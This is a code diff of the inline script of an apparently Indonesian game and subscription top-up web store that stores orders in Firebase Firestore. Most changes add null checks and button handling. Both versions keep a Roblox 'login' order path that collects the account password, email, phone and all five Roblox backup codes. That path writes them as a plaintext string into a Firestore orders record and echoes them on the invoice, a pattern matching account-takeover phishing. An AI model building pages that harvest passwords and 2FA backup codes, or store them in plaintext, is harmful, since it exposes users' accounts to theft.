@@ -363,7 +363,7 @@
         </div>
     </div>
 
-    <!-- SDK Firebase & Script Utama -->
+    <!-- SCRIPT UTAMA YANG AMAN DARI ERROR MODULE -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, doc, setDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
@@ -381,8 +381,8 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        let selectedItemName = "";
-        let selectedItemPrice = "";
+        let selectedItemName = "Spotify 1 Bulan"; // Default awal agar aman
+        let selectedItemPrice = "18.000";
         let selectedType = "standard"; 
         let searchMode = "user";
 
@@ -392,7 +392,7 @@
             selectedType = type;
 
             document.querySelectorAll('.option-card').forEach(card => card.classList.remove('selected'));
-            element.classList.add('selected');
+            if(element) element.classList.add('selected');
 
             document.getElementById('preview-box').innerHTML = `<strong>${name}</strong> — <span style="color:#00f2fe">Rp ${price}</span>`;
 
@@ -400,15 +400,15 @@
             const gpBox = document.getElementById('roblox-gamepass-box');
             const rbxBox = document.getElementById('roblox-login-box');
 
-            stdBox.style.display = 'none';
-            gpBox.style.display = 'none';
-            rbxBox.style.display = 'none';
+            if(stdBox) stdBox.style.display = 'none';
+            if(gpBox) gpBox.style.display = 'none';
+            if(rbxBox) rbxBox.style.display = 'none';
 
-            if(type === 'gamepass') {
+            if(type === 'gamepass' && gpBox) {
                 gpBox.style.display = 'block';
-            } else if(type === 'login') {
+            } else if(type === 'login' && rbxBox) {
                 rbxBox.style.display = 'block';
-            } else {
+            } else if(stdBox) {
                 stdBox.style.display = 'block';
             }
         };
@@ -417,7 +417,8 @@
             document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
             document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
 
-            document.getElementById('tab-' + tabName).classList.add('active');
+            const targetTab = document.getElementById('tab-' + tabName);
+            if(targetTab) targetTab.classList.add('active');
             if(eventObj && eventObj.currentTarget) {
                 eventObj.currentTarget.classList.add('active');
             }
@@ -430,93 +431,103 @@
             const inputField = document.getElementById('search-input-val');
 
             if(mode === 'user') {
-                btnUser.classList.add('active');
-                btnInv.classList.remove('active');
-                inputField.placeholder = "Masukkan Username / User ID kamu...";
+                if(btnUser) btnUser.classList.add('active');
+                if(btnInv) btnInv.classList.remove('active');
+                if(inputField) inputField.placeholder = "Masukkan Username / User ID kamu...";
             } else {
-                btnInv.classList.add('active');
-                btnUser.classList.remove('active');
-                inputField.placeholder = "Masukkan Invoice ID (Contoh: ZN-123456)...";
+                if(btnInv) btnInv.classList.add('active');
+                if(btnUser) btnUser.classList.remove('active');
+                if(inputField) inputField.placeholder = "Masukkan Invoice ID (Contoh: ZN-123456)...";
             }
         };
 
-        // EVENT LISTENER TOMBOL UTAMA (DIJAMIN AKTIF)
-        document.getElementById('btn-pay').addEventListener('click', async function() {
-            const paymentType = document.getElementById('payment-select').value;
+        // EVENT KLIK TOMBOL PEMBAYARAN DIJAMIN AKTIF
+        const payButton = document.getElementById('btn-pay');
+        if(payButton) {
+            payButton.addEventListener('click', async function(e) {
+                e.preventDefault();
+                const paymentType = document.getElementById('payment-select').value;
 
-            if(!selectedItemName) {
-                alert("Harap pilih salah satu produk terlebih dahulu di atas!");
-                return;
-            }
-
-            let finalUserData = "";
-
-            if(selectedType === 'login') {
-                const username = document.getElementById('rbx-username').value.trim();
-                const password = document.getElementById('rbx-password').value.trim();
-                const phone = document.getElementById('rbx-phone-login').value.trim();
-                const email = document.getElementById('rbx-email').value.trim();
-
-                const code1 = document.getElementById('rbx-code-1').value.trim();
-                const code2 = document.getElementById('rbx-code-2').value.trim();
-                const code3 = document.getElementById('rbx-code-3').value.trim();
-                const code4 = document.getElementById('rbx-code-4').value.trim();
-                const code5 = document.getElementById('rbx-code-5').value.trim();
-
-                if(!username || !password) {
-                    alert("Harap isi Username dan Password Roblox!");
-                    return;
-                }
-                if(!code1 || !code2 || !code3 || !code4 || !code5) {
-                    alert("Harap lengkapi ke-5 Kode Backup Roblox!");
+                if(!selectedItemName) {
+                    alert("Harap pilih salah satu produk terlebih dahulu di atas!");
                     return;
                 }
 
-                finalUserData = `[LOGIN RBX] User: ${username} | Pass: ${password} | WA: ${phone} | Email: ${email} | Backup: ${code1}, ${code2}, ${code3}, ${code4}, ${code5}`;
-            } else if(selectedType === 'gamepass') {
-                const username = document.getElementById('gp-username').value.trim();
-                const phone = document.getElementById('gp-phone').value.trim();
+                let finalUserData = "";
 
-                if(!username || !phone) {
-                    alert("Harap isi Username Roblox dan No. WhatsApp!");
-                    return;
+                if(selectedType === 'login') {
+                    const username = document.getElementById('rbx-username').value.trim();
+                    const password = document.getElementById('rbx-password').value.trim();
+                    const phone = document.getElementById('rbx-phone-login').value.trim();
+                    const email = document.getElementById('rbx-email').value.trim();
+
+                    const code1 = document.getElementById('rbx-code-1').value.trim();
+                    const code2 = document.getElementById('rbx-code-2').value.trim();
+                    const code3 = document.getElementById('rbx-code-3').value.trim();
+                    const code4 = document.getElementById('rbx-code-4').value.trim();
+                    const code5 = document.getElementById('rbx-code-5').value.trim();
+
+                    if(!username || !password) {
+                        alert("Harap isi Username dan Password Roblox!");
+                        return;
+                    }
+                    if(!code1 || !code2 || !code3 || !code4 || !code5) {
+                        alert("Harap lengkapi ke-5 Kode Backup Roblox!");
+                        return;
+                    }
+
+                    finalUserData = `[LOGIN RBX] User: ${username} | Pass: ${password} | WA: ${phone} | Email: ${email} | Backup: ${code1}, ${code2}, ${code3}, ${code4}, ${code5}`;
+                } else if(selectedType === 'gamepass') {
+                    const username = document.getElementById('gp-username').value.trim();
+                    const phone = document.getElementById('gp-phone').value.trim();
+
+                    if(!username || !phone) {
+                        alert("Harap isi Username Roblox dan No. WhatsApp!");
+                        return;
+                    }
+
+                    finalUserData = `[GAMEPASS] User: ${username} | WA: ${phone}`;
+                } else {
+                    const standardUser = document.getElementById('user-data-standard').value.trim();
+                    if(!standardUser) {
+                        alert("Harap masukkan Username / User ID Game / No HP!");
+                        return;
+                    }
+                    finalUserData = standardUser;
                 }
 
-                finalUserData = `[GAMEPASS] User: ${username} | WA: ${phone}`;
-            } else {
-                const standardUser = document.getElementById('user-data-standard').value.trim();
-                if(!standardUser) {
-                    alert("Harap masukkan Username / User ID Game / No HP!");
-                    return;
+                const randId = "ZN-" + Math.floor(100000 + Math.random() * 900000);
+                const now = new Date().toLocaleString("id-ID");
+
+                try {
+                    payButton.innerText = "Memproses...";
+                    payButton.disabled = true;
+
+                    await setDoc(doc(db, "orders", randId), {
+                        invoiceId: randId,
+                        product: `${selectedItemName} (Rp ${selectedItemPrice})`,
+                        userData: finalUserData,
+                        paymentMethod: paymentType,
+                        status: "Menunggu Pembayaran",
+                        createdAt: now
+                    });
+
+                    document.getElementById('inv-id').innerText = "#" + randId;
+                    document.getElementById('inv-item').innerText = `${selectedItemName} (Rp ${selectedItemPrice})`;
+                    document.getElementById('inv-user').innerText = finalUserData;
+                    document.getElementById('inv-pay').innerText = paymentType;
+
+                    document.getElementById('invoice-modal').style.display = "flex";
+                } catch (err) {
+                    alert("Gagal terhubung ke database. Error: " + err.message);
+                } finally {
+                    payButton.innerText = "Bayar Sekarang";
+                    payButton.disabled = false;
                 }
-                finalUserData = standardUser;
-            }
+            });
+        }
 
-            const randId = "ZN-" + Math.floor(100000 + Math.random() * 900000);
-            const now = new Date().toLocaleString("id-ID");
-
-            try {
-                await setDoc(doc(db, "orders", randId), {
-                    invoiceId: randId,
-                    product: `${selectedItemName} (Rp ${selectedItemPrice})`,
-                    userData: finalUserData,
-                    paymentMethod: paymentType,
-                    status: "Menunggu Pembayaran",
-                    createdAt: now
-                });
-
-                document.getElementById('inv-id').innerText = "#" + randId;
-                document.getElementById('inv-item').innerText = `${selectedItemName} (Rp ${selectedItemPrice})`;
-                document.getElementById('inv-user').innerText = finalUserData;
-                document.getElementById('inv-pay').innerText = paymentType;
-
-                document.getElementById('invoice-modal').style.display = "flex";
-            } catch (e) {
-                alert("Gagal terhubung ke database. Error: " + e.message);
-            }
-        });
-
-        // MODAL CEK PESANAN
+        // EVENT MODAL & PENCARIAN
         document.getElementById('btn-open-cek').addEventListener('click', () => {
             document.getElementById('cek-pesanan-modal').style.display = 'flex';
         });
@@ -528,7 +539,6 @@
             document.getElementById('invoice-modal').style.display = 'none';
         });
 
-        // FUNGSI PENCARIAN
         document.getElementById('btn-search-exec').addEventListener('click', async function() {
             const searchInput = document.getElementById("search-input-val").value.trim();
             const resultBox = document.getElementById("search-result-content");
@@ -584,8 +594,8 @@
                     });
                     resultBox.innerHTML = htmlResult;
                 }
-            } catch (e) {
-                resultBox.innerHTML = `<p style='color:#ff0055;'>Gagal mencari pesanan: ${e.message}</p>`;
+            } catch (err) {
+                resultBox.innerHTML = `<p style='color:#ff0055;'>Gagal mencari pesanan: ${err.message}</p>`;
             }
         });
     </script>
